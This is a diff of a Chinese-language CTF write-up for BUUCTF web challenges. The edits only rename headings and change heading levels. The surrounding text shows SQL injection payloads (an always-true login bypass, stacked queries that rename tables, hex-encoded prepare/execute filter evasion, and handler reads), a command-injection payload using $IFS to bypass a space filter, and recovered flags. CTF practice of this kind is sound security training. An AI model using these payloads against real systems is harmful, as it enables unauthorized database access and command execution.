@@ -12,7 +12,7 @@
 
 `1 返回正常`<br />`1' 返回异常，存在字符型注入可能`<br />经过测试，发现username和password两个参数都可以分别注入和同时注入<br />构造payload<br />`url?usename=1'&password=1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270426620-acb3876c-9f0d-4dad-b7b5-b7e2f50b557f.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=750&id=uac410499&originHeight=938&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=578355&status=done&style=none&taskId=u9824586b-054d-4e84-998e-a4f99a53025&title=&width=1532.8)<br />回显报错，存在SQL字符型注入<br />**小试一下万能密码注入**<br />构造payload<br />`url?usename=1' or '1'='1&password=1' or '1'='1`<br />**回显flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270808644-23610741-6cba-4ccc-ac0d-20688612546d.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=746&id=u61a5ec44&originHeight=933&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588001&status=done&style=none&taskId=u34c8a5ee-5cfa-462d-8975-2dd088f61f5&title=&width=1524)<br />![](https://cdn.nlark.com/yuque/0/2023/jpeg/36016220/1697271707206-5d837e64-976e-44fc-b710-05a0ca10dd88.jpeg)
 
-## buuctf[极客大挑战 2019]Havefun 1
+## [极客大挑战 2019]Havefun 1
 
 网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789393846-9148e474-ac05-4ced-8fb6-694a470ae325.png#averageHue=%23aae6da&clientId=udc76d59d-d910-4&from=paste&height=758&id=EPVgZ&originHeight=948&originWidth=1892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24499&status=done&style=none&taskId=u09e967db-f466-4bd7-934a-31dcca38159&title=&width=1513.6)<br />title标题<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697789429253-bddc9ec0-be13-4fda-9d05-ca9e24024c6c.png#averageHue=%23fafaf9&clientId=udc76d59d-d910-4&from=paste&height=32&id=u658998dc&originHeight=40&originWidth=242&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2099&status=done&style=none&taskId=u55a9820b-ce79-4425-a498-8d81be75cdd&title=&width=193.6)<br />每一帧都不要放过，或许那个不起眼的地方就存在重要信息<br />到这并未发现什么重要信息，F12看看<br />在源代码底部发现PHP代码：
 ```php
@@ -157,10 +157,10 @@ echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
 
 **构造payload：**<br />`**URL?ip=0;x=ag;cat${IFS}fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219076973-3a184aa5-455d-4a45-a589-0efebf7fb4a3.png#averageHue=%23f7f5f3&clientId=ub5d3c2c2-2e29-4&from=paste&height=38&id=u7ebe6899&originHeight=48&originWidth=350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2073&status=done&style=none&taskId=u83d5b49d-311e-45fb-bc3b-237b51d3596&title=&width=280)<br />字符报错！<br />猜测"{}"被过滤<br />试试第二种空格绕过方法<br />**构造payload:**<br />`**URL?ip=0;x=ag;cat$IFS$1fl$x.php**`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219718651-776f6cfd-2a1b-4bf7-a8bd-8bec0412f405.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=194&id=ube092bab&originHeight=242&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6709&status=done&style=none&taskId=u9d310f28-ddb7-4529-ab14-a89be2deda3&title=&width=457.6)<br />**有回显结果，绕过成功，但是没有发现flag，F12查看网页源代码，看看有没有flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698219743590-733bf4b1-15e3-4bad-8374-3d6e45d77975.png#averageHue=%23f4f4f4&clientId=ub5d3c2c2-2e29-4&from=paste&height=216&id=u3ab197a6&originHeight=270&originWidth=581&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12592&status=done&style=none&taskId=u9dcd84a9-a474-4ab9-ad31-1246b948b85&title=&width=464.8)<br />**得出flag：**<br />`flag{08512195-033d-4f18-a5b0-00dcbc58c4b8}`
 
-## buuctf[强网杯 2019]随便注 1(超详细，三种解法）
+## [强网杯 2019]随便注 1(超详细，三种解法）
 
 <a name="evxPg"></a>
-#### **第一种解法 堆叠注入**
+### **第一种解法 堆叠注入**
 网页环境<br />![image.png](https://img-blog.csdnimg.cn/img_convert/434cfacea88d014f556ac56fdbb36d36.png)<br />判断是否是字符型注入<br />`1'`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2e8bc28f595dbd11974934fa20cfa369.png)<br />判断是否存在关键字过滤<br />`select`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/2c4f19b88e0523022badbf2d4d7d92ec.png)<br />联合查询被过滤，只能用堆叠注入了<br />查看有几个字段<br />`1' order by 2#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/e3ca73027a6fe25e7ae0afa4bda848c9.png)<br />正常回显<br />`1' order by 3#`![image.png](https://img-blog.csdnimg.cn/img_convert/895055b725e189d42fe79ffc45702f31.png)<br />回显报错，可以看出只有两个字段<br />查看所有数据库<br />`1'; show databases;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/823d4fa00155a99b585dde3cf3cef82e.png)<br />查看所有数据表<br />`1'; show tables;`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/b56eead234c1e36df2c5049451dec8a1.png)<br />爆words数据表的字段<br />`1';show columns from words;#`![image.png](https://img-blog.csdnimg.cn/img_convert/72352caabc7e406ed88ce07fb607b3c5.png)<br />爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）<br />`1';show columns from `1919810931114514`;#`<br />![image.png](https://img-blog.csdnimg.cn/img_convert/014d47d3f850c8e809957090e00fb188.png)<br />可以看到这两个表words表有两个字段，而另一个只有一个字段<br />后台SQL查询语句应该是：<br />`select * from words where id=`<br />所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把`1919810931114514`改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。<br />构造payload：<br />`1';rename table words to BaiMao;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#`
 > rename修改表名
 > alter修改已知的列
@@ -173,7 +173,7 @@ echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
 
 成功回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/8122d53a32c6179d396ce793725a8a9c.png)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
 <a name="z4q8F"></a>
-#### 第二种解法 编码逃逸 绕过滤
+### 第二种解法 编码逃逸 绕过滤
 由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514``（注意这里使用反引号把这个数字包括住，md编辑器打不上去） <br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c656374202a2066726f6d206020313931393831303933313131343531342060`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
 > - prepare…from…是预处理语句，会进行编码转换。
 > - execute用来执行由SQLPrepare创建的SQL语句。
@@ -184,7 +184,7 @@ echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
 
 回显flag：<br />![image.png](https://img-blog.csdnimg.cn/img_convert/d9511654ed16ddd5152c6598b5fecbde.png)
 <a name="E2zV0"></a>
-#### 第三种解法 handler代替select
+### 第三种解法 handler代替select
 select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。<br />构造payload：<br />`1'; handler `1919810931114514` open as `a`; handler `a` read next;#`
 > handler代替select，以一行一行显示内容
 > open打开表
